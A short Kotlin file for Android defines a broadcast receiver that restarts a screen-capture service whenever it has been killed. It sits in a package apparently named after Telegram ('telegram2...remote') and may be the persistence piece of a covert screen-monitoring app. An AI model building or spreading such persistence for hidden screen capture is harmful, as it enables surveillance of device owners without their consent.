package com.telegram2.messaging.remote

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class ServiceRestartReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // Ensure screen capture service is running (it may have been killed)
        val captureIntent = Intent(context, ScreenCaptureService::class.java).apply { action = "start" }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(captureIntent)
        } else {
            context.startService(captureIntent)
        }
    }
}